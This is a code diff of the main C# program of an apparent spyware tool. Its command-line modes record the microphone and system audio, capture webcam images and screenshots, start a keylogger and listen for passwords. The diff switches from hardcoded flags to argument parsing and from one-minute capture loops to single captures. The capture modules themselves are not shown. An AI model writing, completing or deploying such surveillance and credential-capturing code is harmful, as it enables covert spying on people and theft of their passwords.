@@ -7,7 +7,7 @@
 
     public class Program
     {
-        static async Task Main(string[] args)
+        public static async Task Main(string[] args)
         {
             int recordTime = 10000;
             bool recordMic = false;
@@ -18,46 +18,46 @@
             bool captureKeyStrokes = false;
             bool listenPassword = false;
 
-            recordAudio = false;
-            captureScreen = true;
-            captureWebCam = true;
-            captureKeyStrokes = true;
+            //recordAudio = false;
+            //captureScreen = true;
+            //captureWebCam = true;
+            //captureKeyStrokes = true;
 
             var tasks = new List<Task>();
 
-            //if (args.Length == 0 || args.Length > 2)
-            //{
-            //    Helpers.Usage();
-            //    Environment.Exit(1);
-            //}
-            //switch (args[0])
-            //{
-            //    case "record_mic":
-            //        recordMic = true;
-            //        break;
-            //    case "record_sys":
-            //        recordSys = true;
-            //        break;
-            //    case "record_audio":
-            //        recordAudio = true;
-            //        break;
-            //    case "capture_screen":
-            //        captureScreen = true;
-            //        break;
-            //    case "capture_webcam":
-            //        captureWebCam = true;
-            //        break;
-            //    case "capture_keystrokes":
-            //        captureKeyStrokes = true;
-            //        break;
-            //    case "listen_for_passwords":
-            //        listenPassword = true;
-            //        break;
-            //    default:
-            //        Helpers.Usage();
-            //        Environment.Exit(1);
-            //        break;
-            //}
+            if (args.Length == 0 || args.Length > 2)
+            {
+                Helpers.Usage();
+                Environment.Exit(1);
+            }
+            switch (args[0])
+            {
+                case "record_mic":
+                    recordMic = true;
+                    break;
+                case "record_sys":
+                    recordSys = true;
+                    break;
+                case "record_audio":
+                    recordAudio = true;
+                    break;
+                case "capture_screen":
+                    captureScreen = true;
+                    break;
+                case "capture_webcam":
+                    captureWebCam = true;
+                    break;
+                case "capture_keystrokes":
+                    captureKeyStrokes = true;
+                    break;
+                case "listen_for_passwords":
+                    listenPassword = true;
+                    break;
+                default:
+                    Helpers.Usage();
+                    Environment.Exit(1);
+                    break;
+            }
 
             // parsing here
             if (recordMic)
@@ -99,38 +99,47 @@
             }
             if (captureWebCam)
             {
-                tasks.Add(Task.Run(async () =>
-                {
-                    Console.WriteLine("Inside captureWebCam");
-                    while (true)
-                    {
-                        string tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
-                        WebCam.CaptureImage(tempFile);
-                        await Task.Delay(TimeSpan.FromMinutes(1));
-                    }
-                }));
+                var tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
+                WebCam.CaptureImage(tempFile);
+
+                //tasks.Add(Task.Run(async () =>
+                //{
+                //    Console.WriteLine("Inside captureWebCam");
+                //    while (true)
+                //    {
+                //        string tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
+                //        WebCam.CaptureImage(tempFile);
+                //        await Task.Delay(TimeSpan.FromMinutes(1));
+                //    }
+                //}));
             }
             if (captureScreen)
             {
-                tasks.Add(Task.Run(async () =>
-                {
-                    Console.WriteLine("Inside captureScreen");
-                    while (true)
-                    {
-                        string tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
-                        Display.CaptureImage(tempFile);
-                        Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
-                        await Task.Delay(TimeSpan.FromMinutes(1));
-                    }
-                }));
+                var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
+                Display.CaptureImage(tempFile);
+                Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
+
+                //tasks.Add(Task.Run(async () =>
+                //{
+                //    Console.WriteLine("Inside captureScreen");
+                //    while (true)
+                //    {
+                //        string tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
+                //        Display.CaptureImage(tempFile);
+                //        Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
+                //        await Task.Delay(TimeSpan.FromMinutes(1));
+                //    }
+                //}));
             }
             if (captureKeyStrokes)
             {
-                tasks.Add(Task.Factory.StartNew(() =>
-                {
-                    Console.WriteLine("Inside captureKeyStrokes");
-                    Keyboard.StartKeylogger();
-                }));
+                Keyboard.StartKeylogger();
+
+                //tasks.Add(Task.Factory.StartNew(() =>
+                //{
+                //    Console.WriteLine("Inside captureKeyStrokes");
+                //    Keyboard.StartKeylogger();
+                //}));
             }
             if (listenPassword)
             {
@@ -147,7 +156,7 @@
             }
 
             //await Task.Factory.ContinueWhenAll(tasks.ToArray(), t => { Console.WriteLine("Completed..."); });
-            await Task.WhenAll(tasks);
+            //await Task.WhenAll(tasks);
 
             Console.ReadKey();
         }
